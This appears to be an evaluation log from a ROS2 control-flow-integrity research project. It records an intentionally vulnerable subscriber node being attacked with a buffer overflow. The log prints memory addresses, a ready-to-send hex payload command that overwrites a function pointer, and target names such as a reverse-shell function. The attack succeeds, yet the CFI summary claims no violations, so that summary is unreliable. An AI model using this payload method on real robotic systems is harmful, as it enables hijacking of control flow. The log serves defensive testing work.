@@ -1,0 +1,70 @@
+[CFI] === ROS2 CFI Day 6 (Final Version) ===
+[CFI] PID: 4820
+[CFI] Process: vulnerable_subs
+[CFI] Strict mode ENABLED
+[0;32m[CFI-SUCCESS] CFI initialized successfully![0m
+[CFI] Waiting for ROS2 callbacks...
+취약한 Subscriber 노드를 시작합니다...
+경고: 이 프로그램은 교육 목적으로만 사용되어야 합니다!
+[WARN] [1748585933.317024247] [vulnerable_subscriber]: 경고: 이 노드는 의도적인 취약점을 포함합니다!
+[WARN] [1748585933.317078109] [vulnerable_subscriber]: 교육 목적으로만 사용하세요.
+
+=== 취약한 노드 메모리 레이아웃 ===
+VulnerableSubscriber 객체 주소: 0x63016ed7fe60
+vulnerable_buffer 주소: 0x63016ed801e0
+function_pointer 주소: 0x63016ed80200
+subscription 주소: 0x63016ed80210
+버퍼에서 함수 포인터까지 거리: 32 bytes
+합법적인 함수 주소: 0x6301489e2600
+악성 함수 주소: 0x6301489e2828
+
+노드가 준비되었습니다. 다음 명령어로 메시지를 보내보세요:
+정상 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String "data: 'Hello'"
+공격 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String "data: 'HEX:414141414141414141414141414141414141414141414141414141414141414128289e48016300000000000000000000'"
+
+=== 공격 가능한 함수 주소들 ===
+execute_calculator 주소: 0x6301489e2d6a
+leak_system_info 주소: 0x6301489e2fda
+spawn_reverse_shell 주소: 0x6301489e3294
+create_pwned_file 주소: 0x6301489e3338
+malicious_function 주소: 0x6301489e2828
+[0;32m[CFI-SUCCESS] === CFI Protection Active! First callback intercepted ===[0m
+[0;32m[CFI-SUCCESS] Registered new subscription 0x7a4268a86830 (hash: 0xd75455d555505ef8)[0m
+[0;32m[CFI-SUCCESS] Registered new subscription 0x630148aa5560 (hash: 0x3d9eab97b043973c)[0m
+
+=== 콜백 호출됨 ===
+받은 메시지 길이: 54 bytes
+메시지 내용: HEX:414141414141414141414141414141414141414141414141414141414141414128289e4801630000
+overflow 이전 함수 포인터: 0x6301489e2600
+16진 변환 결과: 28 bytes 생성됨
+16진 데이터를 바이너리로 변환: 28 bytes
+⚠️  Buffer overflow 발생! 데이터 길이: 28, 버퍼 크기: 20
+overflow 이후 함수 포인터: 0x6301489e2828
+버퍼 내용 (16진수):
+
+0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 
+0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 
+함수 포인터 호출 시도...
+🚨 경고: 악성 함수가 호출되었습니다!
+🚨 공격이 성공했습니다! 시스템이 손상되었을 수 있습니다.
+[ERROR] [1748585936.072696323] [vulnerable_subscriber]: 보안 침해 감지! CFI가 필요합니다!
+악성 행위 시뮬레이션: 가상의 중요 데이터 접근 시도...
+[INFO] [1748585938.313568419] [rclcpp]: signal_handler(signum=15)
+[CFI] 
+=== ROS2 CFI Session Summary ===
+[CFI] 
+╔══════════════════════════════════════════╗
+[CFI] ║        CFI Performance Statistics        ║
+[CFI] ╠══════════════════════════════════════════╣
+[CFI] ║ Total callback executions: 6             ║
+[CFI] ║ Total violations detected: 0             ║
+[CFI] ║ Shadow stack violations:   0             ║
+[CFI] ║ Monitored subscriptions:   2             ║
+[CFI] ║ Validated subscriptions:   2             ║
+[CFI] ║ Shadow stack enabled:      YES           ║
+[CFI] ║ Performance mode:          0             ║
+[CFI] ║ CFI mode:                  STRICT        ║
+[CFI] ║ Hook status:               SUCCESS       ║
+[CFI] ╚══════════════════════════════════════════╝
+[0;32m[CFI-SUCCESS] ✅ No violations detected in 6 callback executions![0m
+[CFI] Statistics saved to /home/acelab/ros2_cfi_project/evaluation/day6_automated_attack_logs/stats_20250530_151817.txt
